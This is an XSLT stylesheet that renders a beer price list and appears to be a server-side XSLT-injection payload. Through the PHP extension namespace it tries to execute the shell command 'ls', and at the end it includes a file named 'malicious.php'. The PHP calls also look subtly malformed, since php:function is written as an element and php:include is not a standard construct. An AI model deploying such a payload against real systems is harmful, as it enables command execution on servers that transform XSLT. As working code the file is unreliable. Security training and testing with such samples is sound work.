<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <html>
      <body style="font-family:Arial;font-size:9pt;background-color:#AABBCC">
        <!-- Liste les fichiers avec une commande PHP -->
        <div style="color:red; font-weight:bold">
          <p>Command Execution (ls):</p>
          <php:function name="exec">
            <xsl:value-of select="'ls'"/>
          </php:function>
        </div>
        
        <!-- Affichage des données des bières -->
        <xsl:for-each select="beers/beer">
          <div style="background-color:teal;color:white;padding:4px">
            <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
            <xsl:value-of select="price"/>
          </div>
          <div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
            <p>
              <xsl:value-of select="description"/>
              <span style="font-style:italic"> (<xsl:value-of select="prct"/> %)</span>
            </p>
          </div>
        </xsl:for-each>

        <!-- Inclusion d'un fichier PHP -->
        <php:include file="malicious.php"/>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
